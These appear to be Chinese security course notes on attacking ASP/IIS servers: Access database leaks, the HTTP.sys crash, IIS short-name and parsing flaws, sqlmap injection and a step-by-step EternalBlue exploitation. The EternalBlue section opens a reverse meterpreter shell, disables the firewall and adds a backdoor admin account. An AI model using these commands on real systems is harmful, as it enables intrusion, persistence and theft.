Day41 WEB攻防-ASP应用&HTTxP.SYS&短文件&文件解析&Access注入&数据库泄漏
#ASP-默认安装-MDB数据库泄漏下载 
大部分ASP程序使用ACCESS数据库搭建，
ACCESS只是一个后缀为*.mdb的文件，在脚本文件中定义配置好数据库路径即用，不需要额外配置安装数据库，所以大部分提前固定好的数据库路径如默认未修改，当攻击者知道数据库的完整路径，可远程下载后解密数据实现攻击。 

#ASP-中间件-CVE&短文件&解析&写权限 -HTTP.SYS（CVE-2015-1635）
 1、漏洞描述 远程执行代码漏洞存在于 HTTP 协议堆栈 (HTTP.sys) 中，当 HTTP.sys 未正确分 析经特殊设计的 HTTP 请求时会导致此漏洞。 成功利用此漏洞的攻击者可以在系统帐户 的上下文中执行任意代码。 
2、影响版本 Windows 7、Windows Server 2008 R2、Windows 8、Windows Server 2012、Windows 8.1 和 Windows Server 2012 R2 
3、漏洞利用条件 安装了IIS6.0以上的Windows 7、Windows Server 2008 R2、Windows 8、 Windows Server 2012、Windows 8.1 和 Windows Server 2012 R2版本 
4、漏洞复现 
msfconsole 
use auxiliary/dos/http/ms15_034_ulonglongadd
set rhosts xx.xx.xx.xx 
set rport xx 
exploit
（此漏洞会导致受害者蓝屏，无法进行提权。）

永恒之蓝
### **步骤 1：环境准备**
1. **目标系统**：未安装MS17-010补丁的Windows 7（确认`445`端口开放）。
2. **攻击机**：Kali Linux（安装Metasploit、nmap、rdesktop等工具）。
3. **网络**：确保目标与Kali在同一网络（或可路由）。

### **步骤 2：扫描目标漏洞**
使用`nmap`检测目标是否存在MS17-010漏洞：
```bash
nmap -p445 --script smb-vuln-ms17-010 <目标IP>
```
### **步骤 3：利用MS17-010漏洞**
1. **启动Metasploit**：
   ```bash
   msfconsole
   ```
2. **选择漏洞模块**：
   ```msf
   use exploit/windows/smb/ms17_010_eternalblue
   ```
3. **配置参数**：
   ```msf
   set RHOSTS <目标IP>
   set PAYLOAD windows/x64/meterpreter/reverse_tcp
   set LHOST <Kali的IP>
   ```
4. **执行攻击**：
   ```msf
   exploit
   ```
   成功后会获得`meterpreter`会话。
### **步骤 4：启用远程桌面（RDP）**
1. **自动启用RDP（推荐）**：
   ```msf
   run post/windows/manage/enable_rdp
   ```
   此命令会自动开启RDP、添加防火墙规则，并提示连接端口。
2. **手动启用RDP（备用）**：
   - 启用远程桌面服务：
     ```meterpreter
     reg setval -k "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" -v fDenyTSConnections -d 0
     ```
   - 启动服务：
     ```meterpreter
     execute -f cmd.exe -a "/c sc start TermService"
     ```
   - 关闭防火墙（可选）：
     ```meterpreter
     execute -f cmd.exe -a "/c netsh advfirewall set allprofiles state off"
     ```

3. **创建或激活用户**（若需要）：
   ```meterpreter
   shell
   net user hacker P@ssw0rd /add
   net localgroup administrators hacker /add
   net localgroup "Remote Desktop Users" hacker /add
   exit
  
### **步骤 5：连接远程桌面**
1. **使用rdesktop连接**：
   rdesktop <目标IP>:3389 -u hacker -p P@ssw0rd

IIS短文件 
1、此漏洞实际是由HTTP请求中旧DOS 8.3名称约定(SFN)的代字符(~)波浪号引起的。它允许远程攻击者在Web根目录下公开文件和文件夹名称(不应该可被访问)。攻击者可以找到通常无法从外部直接访问的重要文件,并获取有关应用程序基础结构的信息。 
2、漏洞成因: 为了兼容16位MS-DOS程序,Windows为文件名较长的文件(和文件夹)生成了对应的 windows 8.3短文件名。在Windows下查看对应的短文件名,可以使用命令dir /x 
3、应用场景：后台路径获取，数据库文件获取，其他敏感文件获取等 
4、利用工具： 
https://github.com/irsdl/IIS-ShortName-Scanner https://github.com/lijiejie/IIS_shortname_Scanner -

IIS 6 解析漏洞
1、该版本默认会将*.asp;.jpg 此种格式的文件名，当成Asp解析
2、该版本默认会将*.asp/目录下的所有文件当成Asp解析。
如:1ogo.asp;.jpgxx.asp/logo.jpg

IIS 7.x 解析漏洞
在一个文件路径(/xx.jpg)后面加上/xx.php会将/xx.jpg/xx.php 解析为php文件
应用场景:配合文件上传获取webshel1

IIS写权限
IIS<=6.0 目录权限开启写入，开启WebDAV，设置为允许
参考利用:https://cloud.tencent.com/developer/article/2050105

#ASP-SQL注入-SQLMAP使用&ACCESS注入
ACCESS数据库无管理帐号密码，顶级架构为表名，列名(字段)，数据，所以在注入猜解中一般采用字典猜解表和列再获取数据，猜解简单但又可能出现猜解不到的情况，由于Access数据库在当前安全发展中已很少存在，故直接使用SQLMAP注入。
sqlmap -u "" --tables  //获取表名
sqlmap -u "" --columns -T xxx  //获取xxx表名下的列名
sqlmap -u -dump -C "" -T admin //获取表名下的列名数据

一些情况
SQL注入：网站对用户的输入没有进行过滤，导致重新定义SQL语句执行。
404页面 -容错页面 这是代码的逻辑设置
sql="select top 1 * from aboutusclass where classid="&classid                    &"  order by OrderID "
sql="select top 1 * from aboutusclass where classid="&3&" union select#   &"  order by OrderID "
